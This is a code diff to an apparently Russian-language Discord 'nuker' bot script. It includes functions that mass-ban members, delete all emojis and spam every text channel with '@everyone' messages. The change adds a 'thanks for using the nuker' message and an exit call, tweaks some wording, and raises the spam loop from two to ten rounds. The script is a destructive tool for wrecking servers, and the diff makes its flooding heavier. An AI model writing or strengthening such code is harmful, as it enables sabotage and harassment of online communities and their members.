@@ -53,6 +53,8 @@ def main(t, m, p, txt, n):
                 await chspam(gi)
                 await rspam(gi)
                 await spam(gi, txt)
+            print(f"\n\n{G}Спасибо за использование нюкера, надеюсь вам понравилось!{W}")
+            sys.exit()
     if m == "1":
         print("Жду комманду !nuke")
 
@@ -86,6 +88,8 @@ def main(t, m, p, txt, n):
                     await chspam(arg)
                 elif part == "rs":
                     await rspam(arg)
+            print(f"\n\n{G}Спасибо за использование нюкера, надеюсь вам понравилось!{W}")
+            sys.exit()
 
     try:
         client.run(t)
@@ -121,7 +125,7 @@ async def ban(guild):
                 print(f"{R}{member} - слишком силен{W}")
                 continue
 
-            print(f"> Было {ppl}  человек, забанил {bn} человек.")
+            print(f"> Было {ppl}  человек(а), забанил {bn} человек(а).")
     except:
         print(f"{R}Не смог забанить{W}")
 
@@ -179,8 +183,8 @@ async def dele(guild):
         for emoji in list(guild.emojis):
             await emoji.delete()
             counter += 1
-            print("Удалил смайлик", counter, end="\r")
-        print("Удалил смайлик", counter)
+            print("Удалил ", counter, " смайликов", end="\r")
+        print("Удалил ", counter, " смайликов")
         print("> Все, смайлов больше нет....")
     except:
         print(f"{R}Не смог удалить смайлики{W}")
@@ -241,7 +245,7 @@ async def rspam(guild):
 async def spam(guild, stext):
     try:
         print("> Спам активирован")
-        for r in range(2):
+        for r in range(10):
             for channel in guild.text_channels:
                 await channel.send("@everyone " + stext)
     except:
